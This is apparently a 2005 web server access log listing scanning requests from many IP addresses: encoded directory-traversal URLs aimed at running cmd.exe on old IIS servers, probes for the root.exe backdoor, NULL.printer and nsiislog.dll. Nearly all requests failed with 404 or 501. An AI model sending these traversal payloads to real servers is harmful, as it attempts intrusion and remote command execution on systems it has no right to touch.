61.72.66.8 - - [14/Jun/2005:11:32:02 -0400] "get /scripts/..%5c../winnt/system32/cmd.exe?/c+dir" 501 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
68.236.170.254 - - [21/Jun/2005:21:48:23 -0400] "GET /NULL.printer" 404 301 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
200.162.114.135 - - [22/Jun/2005:15:27:49 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
206.49.194.36 - - [18/Feb/2005:01:44:37 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
81.6.250.202 - - [03/Feb/2005:03:38:35 -0500] "GET /NULL.printer" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:33 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:58 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
202.118.167.71 - - [16/Jun/2005:05:00:33 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:58 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
63.197.230.242 - - [12/Jun/2005:13:14:15 -0400] "get /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir" 501 333 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:58 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:58 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
216.204.128.187 - - [22/Jun/2005:03:55:28 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
200.162.114.135 - - [22/Jun/2005:15:27:49 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
66.64.221.234 - - [17/Aug/2005:16:45:25 -0400] "GET /NULL.printer" 404 301 "-" "-"
63.197.230.242 - - [12/Jun/2005:13:14:15 -0400] "get /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir" 501 333 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:31 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:30:59 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:53 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"